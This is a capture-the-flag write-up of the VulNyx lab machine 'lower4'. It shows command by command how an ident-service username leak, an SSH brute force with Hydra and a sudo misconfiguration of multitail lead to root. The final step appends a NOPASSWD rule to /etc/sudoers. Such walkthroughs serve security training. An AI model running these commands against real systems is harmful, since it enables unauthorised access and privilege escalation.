# lower4

## Executive Summary

| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| lower4 | d4t4s3c | Low | VulNyx |

**Summary:** The lower4 machine was compromised through a two-stage attack beginning with open-source intelligence gathering via the `ident` service on port 113. A secondary Nmap scan using the `auth-owners` script revealed that the `ident` daemon was advertising the username `lucifer` as the owner of the service running on that port, effectively leaking a valid system account. With a confirmed username in hand, a brute-force attack against SSH using Hydra and the rockyou wordlist quickly recovered the password `789456123`, granting direct shell access to the machine. Once inside as `lucifer`, enumeration of `sudo` privileges revealed that the account could execute `/usr/bin/multitail` as root without any password. The `multitail` utility, designed for monitoring multiple log files simultaneously, accepts a `-l` flag that runs an arbitrary shell command as input. By abusing this flag with root privileges, a crafted command was executed that appended a full `NOPASSWD:ALL` sudo rule for `lucifer` into `/etc/sudoers`. With this self-granted privilege, `sudo -i` was invoked to obtain a root shell, completing the privilege escalation.

---

## Reconnaissance

### Initial Port Scan

The assessment opened with a thorough Nmap scan to identify all open TCP ports and enumerate their associated services and versions.

1. Running a full port scan with service and script detection:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/vulnyx]
└─$ nmap -sC -sV -p- -T4 $ip
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-09 22:30 +0700
Nmap scan report for 192.168.100.220 (192.168.100.220)
Host is up (0.0023s latency).
Not shown: 65532 closed tcp ports (reset)
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 f0:e6:24:fb:9e:b0:7a:1a:bd:f7:b1:85:23:7f:b1:6f (RSA)
|   256 99:c8:74:31:45:10:58:b0:ce:cc:63:b4:7a:82:57:3d (ECDSA)
|_  256 60:da:3e:31:38:fa:b5:49:ab:48:c3:43:2c:9f:d1:32 (ED25519)
80/tcp  open  http    Apache httpd 2.4.56 ((Debian))
|_http-server-header: Apache/2.4.56 (Debian)
|_http-title: Apache2 Debian Default Page: It works
113/tcp open  ident?
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 187.43 seconds
```

Three ports were identified: SSH on 22, an Apache web server on 80 presenting only the default Debian page, and a service on port 113. Port 113 is historically associated with the `ident` protocol, which maps active TCP connections back to the operating system user that owns them. This is a significant intelligence source.

### Username Disclosure via the Ident Service

2. A second scan was run with the `auth-owners` NSE script enabled, which queries the `ident` service to discover the OS-level owner of each open port:

```bash
┌──(kali㉿kali)-[~]
└─$ nmap -sS -sC -sV -p- --min-rate 5000 -T5 $ip
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-09 12:06 -0400
Warning: 192.168.100.220 giving up on port because retransmission cap hit (2).
Stats: 0:04:12 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 66.67% done; ETC: 12:11 (0:01:14 remaining)
Nmap scan report for 192.168.100.220 (192.168.100.220)
Host is up (0.00089s latency).
Not shown: 35011 filtered tcp ports (no-response), 30521 closed tcp ports (reset)
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 f0:e6:24:fb:9e:b0:7a:1a:bd:f7:b1:85:23:7f:b1:6f (RSA)
|   256 99:c8:74:31:45:10:58:b0:ce:cc:63:b4:7a:82:57:3d (ECDSA)
|_  256 60:da:3e:31:38:fa:b5:49:ab:48:c3:43:2c:9f:d1:32 (ED25519)
|_auth-owners: root
80/tcp  open  http    Apache httpd 2.4.56 ((Debian))
|_http-server-header: Apache/2.4.56 (Debian)
|_http-title: Apache2 Debian Default Page: It works
113/tcp open  ident?
|_auth-owners: lucifer
MAC Address: 08:00:27:79:B3:61 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 283.78 seconds
```

The `auth-owners` output was decisive: SSH on port 22 was owned by `root`, and the `ident` service on port 113 was owned by `lucifer`. This confirmed `lucifer` as a valid system account, providing a concrete username to target.

---

## Initial Access

### SSH Brute Force

3. With the username `lucifer` confirmed, Hydra was used to brute-force the SSH service against the rockyou wordlist:

```bash
┌──(kali㉿kali)-[~]
└─$ hydra -l lucifer -P /usr/share/wordlists/rockyou.txt ssh://$ip -t 8 -I
Hydra v9.7 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-08-09 12:17:11
[DATA] max 8 tasks per 1 server, overall 8 tasks, 14344399 login tries (l:1/p:14344399), ~1793050 tries per task
[DATA] attacking ssh://192.168.100.220:22/
[STATUS] 120.00 tries/min, 120 tries in 00:01h, 14344279 to do in 1992:16h, 8 active
[22][ssh] host: 192.168.100.220   login: lucifer   password: 789456123
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-08-09 12:19:39
```

The password `789456123` was found in under three minutes. The credentials were immediately used to establish an SSH session:

4. Logging in as `lucifer` and confirming identity:

```bash
┌──(kali㉿kali)-[~]
└─$ ssh lucifer@$ip                    
The authenticity of host '192.168.100.220 (192.168.100.220)' can't be established.
ED25519 key fingerprint is: SHA256:3dqq7f/jDEeGxYQnF2zHbpzEtjjY49/5PvV5/4MMqns
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.100.220' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
lucifer@192.168.100.220's password: 
lucifer@lower4:~$ id;whoami
uid=1000(lucifer) gid=1000(lucifer) grupos=1000(lucifer)
lucifer
lucifer@lower4:~$ ls
user.txt
```

A shell was obtained as `lucifer` and the user flag was confirmed present in the home directory.

---

## Privilege Escalation

### Sudo Enumeration

5. Checking what commands `lucifer` could run as root via `sudo`:

```bash
lucifer@lower4:~$ sudo -l
Matching Defaults entries for lucifer on lower4:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User lucifer may run the following commands on lower4:
    (root) NOPASSWD: /usr/bin/multitail
lucifer@lower4:~$ /usr/bin/multitail 
```

The `lucifer` user was permitted to run `/usr/bin/multitail` as root with no password. `multitail` is a terminal utility for watching multiple log files in real time, but it exposes a dangerous feature via its `-l` flag: it accepts an arbitrary shell command whose output it treats as a log stream. Because this command is executed with the privileges of the invoking user (in this case, root), it is a direct path to arbitrary command execution as root.

### Abusing multitail for Sudoers Injection

6. The `-l` flag was used to run a shell command that appended a full privilege rule for `lucifer` into `/etc/sudoers`, then `sudo -l` was run to confirm the injection succeeded, and finally `sudo -i` was called to open a root shell:

```bash
lucifer@lower4:~$ sudo -u root /usr/bin/multitail -l 'echo "lucifer ALL=(ALL:ALL) NOPASSWD:ALL" >> /etc/sudoers'
lucifer@lower4:~$ sudo -l
Matching Defaults entries for lucifer on lower4:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User lucifer may run the following commands on lower4:
    (root) NOPASSWD: /usr/bin/multitail
    (ALL : ALL) NOPASSWD: ALL
lucifer@lower4:~$ sudo -i
root@lower4:~# id;whoami;hostname;pwd
uid=0(root) gid=0(root) grupos=0(root)
root
lower4
/root
```

The `multitail` command executed the `echo` pipeline as root, writing the new sudo rule directly into `/etc/sudoers`. With `NOPASSWD:ALL` now in effect for `lucifer`, a simple `sudo -i` elevated the session to a fully privileged root shell.

---

## Attack Chain Summary

1. **Reconnaissance**: A full Nmap scan discovered SSH (22), Apache (80), and an `ident` service (113). The default Apache page offered no further web attack surface.

2. **Vulnerability Discovery**: A second scan using the `auth-owners` NSE script queried the `ident` service and disclosed the username `lucifer` as the owner of the process on port 113, confirming a valid system account.

3. **Exploitation**: Hydra performed a dictionary attack against SSH using the rockyou wordlist with `lucifer` as the fixed username, recovering the weak password `789456123` in under three minutes and granting a direct SSH session.

4. **Internal Enumeration**: `sudo -l` revealed that `lucifer` could execute `/usr/bin/multitail` as root without any password. The utility's `-l` command execution flag was identified as an abuse vector.

5. **Privilege Escalation**: `multitail` was invoked as root with the `-l` flag supplying an `echo` command that injected a `NOPASSWD:ALL` sudo rule for `lucifer` into `/etc/sudoers`. The new rule was immediately confirmed, and `sudo -i` was used to obtain a root shell.
